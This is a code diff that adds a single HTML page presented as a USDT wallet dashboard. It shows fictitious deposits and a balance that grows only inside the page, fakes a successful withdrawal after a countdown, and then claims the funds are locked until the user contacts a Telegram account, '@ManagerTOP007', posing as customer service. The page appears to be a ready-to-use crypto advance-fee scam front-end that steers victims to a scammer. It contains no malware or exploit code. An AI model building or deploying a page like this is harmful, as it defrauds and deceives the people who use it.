@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet Simulator</title>
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --text-color: #c9d1d9;
+            --accent-color: #238636;
+            --danger-color: #da3633;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            margin-bottom: 20px;
+        }
+
+        h2, h3 {
+            text-align: center;
+            color: #fff;
+        }
+
+        .user-info {
+            text-align: center;
+            font-weight: bold;
+            color: #58a6ff;
+            margin-bottom: 15px;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, #1f2937, #111827);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #2ea44f;
+            border: 1px solid #30363d;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            color: #fff;
+            transition: 0.2s;
+        }
+
+        .btn-success { background-color: var(--accent-color); margin-right: 5px; }
+        .btn-danger { background-color: var(--danger-color); }
+        .btn-primary { background-color: #2188ff; width: 100%; margin-top: 10px;}
+
+        .request-item {
+            background: #21262d;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #30363d;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #fff;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #161b22;
+            border: 2px solid #f25757;
+            padding: 25px;
+            border-radius: 12px;
+            z-index: 1000;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+            width: 80%;
+            max-width: 400px;
+        }
+
+        .modal a {
+            color: #58a6ff;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 999;
+        }
+
+        .timer-msg {
+            color: #e3b341;
+            font-weight: bold;
+            margin-top: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>USDT Wallet Dashboard</h2>
+    <div class="user-info">User ID: <span id="userIdDisplay">Loading...</span></div>
+    
+    <div class="balance-card">
+        Balance: <span id="mainBalance">0.00</span> USDT
+    </div>
+
+    <h3>Withdraw Funds</h3>
+    <form id="withdrawForm" onsubmit="handleWithdraw(event)">
+        <label>Select Network</label>
+        <select required>
+            <option value="TRC20">USDT - TRC20</option>
+            <option value="ERC20">USDT - ERC20</option>
+            <option value="BEP20">USDT - BEP20</option>
+        </select>
+
+        <label>Crypto Wallet Address</label>
+        <input type="text" placeholder="Enter USDT Wallet Address" required>
+
+        <label>Withdrawal Amount (USDT)</label>
+        <input type="number" id="withdrawAmount" placeholder="0.00" min="1" step="any" required>
+
+        <button type="submit" class="btn btn-primary">Confirm Withdrawal</button>
+    </form>
+    <div id="withdrawStatus" class="timer-msg"></div>
+</div>
+
+<div class="container">
+    <h3>Incoming Deposit Network</h3>
+    <div id="requestList">
+        <!-- Dynamic requests will be loaded here via JavaScript -->
+    </div>
+</div>
+
+<div class="overlay" id="overlay"></div>
+<div class="modal" id="verificationModal">
+    <h3 style="color: var(--danger-color); margin-top: 0;">Unlock For Withdrawal</h3>
+    <p>Your withdrawal is currently locked. Complete the identity verification to clear the funds.</p>
+    <p>Please contact our official Customer Service immediately:</p>
+    <p style="margin-top: 15px; margin-bottom: 15px;">
+        <a href="https://t.me/ManagerTOP007" target="_blank">✉ Contact: @ManagerTOP007</a>
+    </p>
+    <button class="btn btn-danger" style="margin-top: 5px; width: 100%;" onclick="closeModal()">Dismiss</button>
+</div>
+
+<script>
+    // 1. Generate unique alphanumeric User ID
+    const randomUserId = "UID-" + Math.floor(100000 + Math.random() * 900000);
+    document.getElementById('userIdDisplay').innerText = randomUserId;
+
+    let balance = 0.00;
+
+    // 2. Mock high-amount deposit data
+    const fakeRequests = [
+        { id: 1, amount: 850 },
+        { id: 2, amount: 2400 },
+        { id: 3, amount: 5650 },
+        { id: 4, amount: 12000 },
+        { id: 5, amount: 25000 }
+    ];
+
+    const requestListDiv = document.getElementById('requestList');
+    
+    function renderRequests() {
+        requestListDiv.innerHTML = '';
+        if(fakeRequests.length === 0) {
+            requestListDiv.innerHTML = '<p style="text-align:center; color:#8b949e;">No pending deposits available.</p>';
+            return;
+        }
+        
+        fakeRequests.forEach(req => {
+            const item = document.createElement('div');
+            item.className = 'request-item';
+            item.innerHTML = `
+                <div>
+                    <strong style="color: #58a6ff;">+${req.amount} USDT</strong> <br>
+                    <small style="color: #8b949e;">Network: TRC20</small>
+                </div>
+                <div>
+                    <button class="btn btn-success" onclick="acceptDeposit(${req.id}, ${req.amount})">Accept</button>
+                    <button class="btn btn-danger" onclick="rejectDeposit(${req.id})">Reject</button>
+                </div>
+            `;
+            requestListDiv.appendChild(item);
+        });
+    }
+
+    // 3. Logic for Accept Button (Adds 25% or 30% bonus randomly)
+    function acceptDeposit(id, amount) {
+        const percentages = [0.25, 0.30];
+        const chosenPercentage = percentages[Math.floor(Math.random() * percentages.length)];
+        
+        const addedAmount = amount * chosenPercentage;
+        balance += addedAmount;
+        
+        document.getElementById('mainBalance').innerText = balance.toFixed(2);
+        
+        removeRequest(id);
+        alert(`Successfully Accepted! ${chosenPercentage * 100}% of the deposit (${addedAmount.toFixed(2)} USDT) has been credited to your balance.`);
+    }
+
+    // 4. Logic for Reject Button
+    function rejectDeposit(id) {
+        removeRequest(id);
+        alert("Deposit request rejected successfully.");
+    }
+
+    function removeRequest(id) {
+        const index = fakeRequests.findIndex(r => r.id === id);
+        if (index > -1) {
+            fakeRequests.splice(index, 1);
+            renderRequests();
+        }
+    }
+
+    // 5. Withdrawal system with 3-minute countdown
+    function handleWithdraw(event) {
+        event.preventDefault();
+        const amount = parseFloat(document.getElementById('withdrawAmount').value);
+
+        if (amount > balance) {
+            alert("Error: Insufficient wallet balance!");
+            return;
+        }
+
+        let timeLeft = 180; // 3 minutes = 180 seconds
+        const statusDiv = document.getElementById('withdrawStatus');
+        
+        // Disable form elements during processing
+        document.getElementById('withdrawForm').querySelectorAll('input, button, select').forEach(elem => elem.disabled = true);
+
+        const timer = setInterval(() => {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+
+            statusDiv.innerHTML = `Withdrawal processing... Time remaining: ${minutes}:${seconds}`;
+            timeLeft--;
+
+            if (timeLeft < 0) {
+                clearInterval(timer);
+                
+                // Show success message after 3 minutes
+                statusDiv.innerHTML = `<span style="color: #2ea44f;">✔ Withdrawal of ${amount} USDT Successfully Processed!</span>`;
+                
+                balance -= amount;
+                document.getElementById('mainBalance').innerText = balance.toFixed(2);
+
+                // Open the Customer Service Verification Modal after 1.5 seconds
+                setTimeout(() => {
+                    openModal();
+                    document.getElementById('withdrawForm').querySelectorAll('input, button, select').forEach(elem => elem.disabled = false);
+                    document.getElementById('withdrawForm').reset();
+                }, 1500);
+            }
+        }, 1000);
+    }
+
+    // 6. Verification Modal Functions
+    function openModal() {
+        document.getElementById('verificationModal').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+    }
+
+    function closeModal() {
+        document.getElementById('verificationModal').style.display = 'none';
+        document.getElementById('overlay').style.display = 'none';
+    }
+
+    // Initial load
+    renderRequests();
+</script>
+
+</body>
+  </html>
+  
